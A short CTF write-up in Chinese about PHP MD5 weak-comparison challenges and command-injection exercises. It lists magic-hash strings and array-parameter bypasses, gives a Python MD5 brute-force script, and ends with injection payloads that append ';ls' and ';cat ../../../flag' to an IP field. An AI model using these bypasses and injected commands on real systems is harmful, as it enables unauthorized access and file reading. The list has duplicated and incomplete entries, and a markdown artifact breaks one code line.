**EZMD5**
![](TU/image%20copy%2052.png)

这里是弱比较，0e在这里作为0
md5加密后为0e开头的就可以绕过
0e开头的md5和原值：
```
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
```

**EZMD5_1**
![](TU/image%20copy%2053.png)

GET一个a一个b，两个之不相等，md5加密后进行弱比较

**EZMD5_2**
![](TU/image%20copy%2054.png)

MD5加密数组返回NULL,后面的代码继续进行
`a[]=1&b[]=2`

**EZMD5_3**
![](TU/image%20copy%2055.png)
如果是 === ，可以使用数组绕过
**EZMD5_4**
![](TU/image%20copy%2056.png)
用代码暴力跑出来
```
import hashlib

# 目标：MD5 最后 6 位必须是 d54e23
target_suffix = "d54e23"

# 从 0 开始暴力枚举
i = 0
while True:
    # 转成字符串计算 MD5
    s = str(i)
    md5_value = hashlib.md5(s.encode()).hexdigest()
    
    # 取最后 6 位
    suffix = md5_value[-6:]
    
    # 找到就输出
    if suffix == target_suffix:
        print("找到答案！")
        print(f"字符串：{s}")
        print(f"MD5 值：{md5_value}")
        print(f"最后6位：{suffix}")
        break
    
    # 每 100 万次输出进度（可选）
    if i % 1000000 == 0:
        print(f"正在尝试：{i}...")
    
    i += **1**
```
**EZMD5_5**
![](TU/image%20copy%2057.png)
ab不等，但哈希值相同
数组绕过
![](TU/image%20copy%2058.png)
数组绕过

**EZCMD**
![](TU/image%20copy%2059.png)
PSOT:cmd=nl /flag

**EZCMD_1**
![](TU/image%20copy%2060.png)
PSOT:cmd=127.0.0.1;ls     查目录
在../../../目录下有flag
cmd=127.0.0.1;cat ../../../flag






















